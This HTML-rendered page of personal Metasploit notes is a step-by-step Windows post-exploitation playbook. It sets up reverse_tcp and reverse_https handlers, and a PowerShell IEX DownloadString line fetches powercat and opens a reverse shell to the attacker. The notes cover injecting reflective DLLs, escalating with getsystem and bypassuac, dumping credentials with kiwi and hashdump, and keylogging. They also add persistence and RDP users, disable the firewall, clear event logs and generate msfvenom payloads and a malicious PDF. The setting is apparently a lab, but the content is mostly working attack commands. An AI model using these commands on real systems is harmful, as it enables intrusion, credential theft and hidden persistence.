<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Metasploit.md – Metasploit</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
    /* CSS for syntax highlighting */
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        background-color: #232629;
        color: #7a7c7d;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
    div.sourceCode
      { color: #cfcfc2; background-color: #232629; }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span { color: #cfcfc2; } /* Normal */
    code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
    code span.an { color: #3f8058; } /* Annotation */
    code span.at { color: #2980b9; } /* Attribute */
    code span.bn { color: #f67400; } /* BaseN */
    code span.bu { color: #7f8c8d; } /* BuiltIn */
    code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #3daee9; } /* Char */
    code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
    code span.co { color: #7a7c7d; } /* Comment */
    code span.cv { color: #7f8c8d; } /* CommentVar */
    code span.do { color: #a43340; } /* Documentation */
    code span.dt { color: #2980b9; } /* DataType */
    code span.dv { color: #f67400; } /* DecVal */
    code span.er { color: #da4453; text-decoration: underline; } /* Error */
    code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
    code span.fl { color: #f67400; } /* Float */
    code span.fu { color: #8e44ad; } /* Function */
    code span.im { color: #27ae60; } /* Import */
    code span.in { color: #c45b00; } /* Information */
    code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
    code span.op { color: #cfcfc2; } /* Operator */
    code span.ot { color: #27ae60; } /* Other */
    code span.pp { color: #27ae60; } /* Preprocessor */
    code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
    code span.sc { color: #3daee9; } /* SpecialChar */
    code span.ss { color: #da4453; } /* SpecialString */
    code span.st { color: #f44f4f; } /* String */
    code span.va { color: #27aeae; } /* Variable */
    code span.vs { color: #da4453; } /* VerbatimString */
    code span.wa { color: #da4453; } /* Warning */
  </style>
  <link rel="stylesheet" href="Css/include.css" />
</head>
<body>
<header id="title-block-header">
<h1 class="title">Metasploit</h1>
</header>
<section id="mestaploit-stager-step-by-step" class="level1">
<h1>Mestaploit Stager Step by Step</h1>
<section id="msf-listen-tcp-handler" class="level2">
<h2>1/ MSF Listen tcp handler</h2>
<p>msfconsole use multi/handler options set PAYLOAD
windows/meterpreter/reverse_tcp set LHOST 192.168.56.1 set LPORT 6969
run -j</p>
<p>jobs echo Trigger reverse shell on victim</p>
<p>sessions</p>
</section>
<section id="meterpreter-survive" class="level2">
<h2>2/ Meterpreter Survive</h2>
<p>migrate -N gvim.exe sessions -u 1</p>
</section>
<section id="meterpreter-loot" class="level2">
<h2>3/ Meterpreter Loot</h2>
<p>sysinfo getuid getpid ps run post/windows/gather/win_privs route run
post/windows/gather/enum_logged_on_users</p>
<p>echo “Same as getprivs”</p>
</section>
<section id="meterpreter-persist" class="level2">
<h2>4/ Meterpreter Persist</h2>
<p>search platform:windows persist</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode ps1"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">IEX</span><span class="op">(</span><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadString</span><span class="op">(</span><span class="st">&#39;https://raw.githubusercontent.com/rexpository/powercat-v2.0/main/powercat.ps1&#39;</span><span class="op">);</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>powerrcatt <span class="op">-</span>c <span class="dv">192.168</span><span class="op">.</span><span class="dv">56.1</span> <span class="op">-</span>p <span class="dv">6969</span> <span class="op">-</span>e powershell</span></code></pre></div>
<p>set payload windows/shell_reverse_tcp</p>
</section>
<section id="meterpreter-inject-reflective-dll-payload" class="level2">
<h2>5/ Meterpreter Inject reflective dll (Payload)</h2>
<p>use windows/manage/reflective_dll_inject options set PROCESS
notepad.exe set PATH
~/Software/C/DreamStager/archive/reflective_dll_stephenfewer.x64.dll set
PATH ~/Software/C/DreamStager/archive/reflective_dll_dreamlab.x64.dll
set session 4 run</p>
</section>
<section id="meterpreter-search-escalation-winpeas" class="level2">
<h2>7/ Meterpreter Search escalation (winpeas)</h2>
<p>get_system run post/multi/recon/local_exploit_suggester</p>
<p>upload ~/Iso/Pentest/winPEAS_dotfuscated.exe C:/Users/User/Downloads
shell C:/Users/User/Downloads/winPEAS_dotfuscated.exe -h</p>
<p>search platform:windows adduser</p>
</section>
<section id="meterpreter-loot-system" class="level2">
<h2>8/ Meterpreter Loot System</h2>
<p>load kiwi help kiwi kiwi_cmd version creds_all</p>
<p>hashdump run post/windows/gather/hashdump run
post/windows/gather/credentials/sso</p>
</section>
<section id="meterpreter-persist-system" class="level2">
<h2>9/ Meterpreter Persist System</h2>
<p>use exploit/windows/local/persistence_service set payload
windows/meterpreter/reverse_tcp set session 2 exploit</p>
<p>use post/windows/manage/enable_rdp options set username user2 set
password password set session 2 run</p>
<p>echo call remmina app</p>
</section>
</section>
<section id="enhanced-metasploit-generate-payloads" class="level1">
<h1>Enhanced metasploit: Generate payloads</h1>
<section id="msf-generate-exploit-stage1-pdf" class="level2">
<h2>1/ MSF Generate exploit stage1 PDF</h2>
<p>reload
~/.msf4/modules/exploits/windows/adobe_reader_reset_form_rce.rb use
exploit/windows/adobe_reader_reset_form_rce set PAYLOAD
windows/meterpreter/reverse_tcp set LHOST 192.168.56.1 set LPORT 6969
run</p>
</section>
<section id="msf-generate-payload-from-c-local" class="level2">
<h2>2/ MSF Generate payload from C local</h2>
<p>reload ~/.msf4/modules/payloads/singles/windows/dll_messagebox.rb use
payload/windows/dll_messagebox options generate</p>
</section>
</section>
<section id="resource-mfsvenom" class="level1">
<h1>Resource Mfsvenom</h1>
<p>msfvenom -p windows/meterpreter/reverse_https -f exe
LHOST=192.168.56.1 LPORT=6969 &gt; metasploit_https.exe</p>
<p>use multi/handler set PAYLOAD windows/meterpreter/reverse_https</p>
</section>
<section id="resource-meterpreter" class="level1">
<h1>Resource Meterpreter</h1>
<p>Ref:
https://www.scaler.com/topics/cyber-security/meterpreter-command-cheatsheet/
Load:
https://docs.metasploit.com/docs/using-metasploit/intermediate/how-to-use-plugins.html</p>
<p>load -l</p>
<section id="meterpreter-survive-1" class="level3">
<h3>Meterpreter survive</h3>
<p>ps -U User migrate -N Explorer.exe</p>
<ol type="1">
<li><p>svchost.exe</p></li>
<li><p>RuntimeBroker.exe</p></li>
<li><p>dllhost.exe</p></li>
<li><p>Explorer.exe</p></li>
<li><p>OneDrive.exe</p></li>
<li><p>msedge.exe</p></li>
</ol>
<p>execute -H -k -f cmd -a “/c netsh firewall set opmode
mode=disable”</p>
</section>
<section id="nx" class="level3">
<h3>NX</h3>
<p>bcdedit.exe /set (current) nx AlwaysOff. or error 0xc0000005</p>
</section>
<section id="meterpreter-hide" class="level3">
<h3>Meterpreter hide</h3>
<p>clearev</p>
</section>
<section id="meterpreter-elevate" class="level3">
<h3>Meterpreter elevate</h3>
<p>getsystem psexec -i -s cmd.exe</p>
<p>use exploit/windows/local/bypassuac</p>
</section>
<section id="meterpreter-persist-1" class="level3">
<h3>Meterpreter persist</h3>
<p>echo “This is detected” use
exploit/windows/local/registry_persistence set payload
windows/meterpreter/reverse_https</p>
</section>
<section id="meterpreter-script" class="level3">
<h3>Meterpreter Script</h3>
<p>irb # for Interactive Ruby Shell</p>
<p>sys p = sys.process.execute(‘calc.exe’)</p>
</section>
<section id="meterpreter-loot-1" class="level3">
<h3>Meterpreter Loot</h3>
<p>keyscan_start keyscan_dump</p>
<section id="admin" class="level4">
<h4>Admin</h4>
<blockquote>
<p>Change password shell net user User password2</p>
</blockquote>
</section>
</section>
</section>
<section id="resource-metasploit-and-bash" class="level1">
<h1>Resource Metasploit and Bash</h1>
<p>msfconsole py3 unicorn.py windows/meterpreter/reverse_https
192.168.1.56 6970</p>
<p>Ref: https://github.com/trustedsec/unicorn</p>
<section id="command-line" class="level3">
<h3>Command line</h3>
<p>vim ~/.msf4/logs/framework.log</p>
</section>
<section id="msf-irb-dump" class="level3">
<h3>Msf IRB Dump</h3>
<p>Msf::Ui::Console::CommandDispatcher:: dl =
Msf::Ui::Console::CommandDispatcher::Dreamlab.new
Metasm::WindowsExports::EXPORT</p>
</section>
<section id="msfconsole-base" class="level3">
<h3>Msfconsole base</h3>
<p>? help loadpath ~/.msf4/modules/ reload
~/.msf4/modules/payloads/stages/windows/bin_meterpreter_1000.rb</p>
</section>
<section id="command-line-1" class="level3">
<h3>Command line</h3>
<p>/usr/bin/msfconsole
/opt/metasploit-framework/embedded/framework/msfconsole
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb
&lt;= Register the commands
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/jobs.rb</p>
<ul>
<li><a
href="file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm.html">file:
block_reverse_tcp.asm</a></li>
<li><a
href="file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/block/block_api.asm.html">file:
block_api.asm</a></li>
<li><a
href="file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/stager/stager_reverse_tcp_nx.asm.html">file:
stager_reverse_tcp.asm</a></li>
</ul>
<p>lib/msf_autoload.rb <a
href="./lib/msf/core/payload/windows/x64/meterpreter_loader_x64.rb.md.html">lib
msf core payload windows x64 meterpreter_loader_x64 rb</a></p>
<p>modules/payloads/stages/windows/x64/meterpreter.rb</p>
<p>ls <a
href="/opt/metasploit-framework/embedded/framework/scripts/meterpreter.md.html">opt
metasploit framework embedded framework scripts meterpreter</a> msfvenom
-p windows/meterpreter/reverse_tcp -a x86 LHOST=192.168.56.1 LPORT=6969
&gt; metasploit_tcp.bin</p>
<p>set LHOST 192.168.56.1 set LPORT 6969 sessions -i 1 jobs -k 5 use
0</p>
</section>
</section>
</body>
</html>
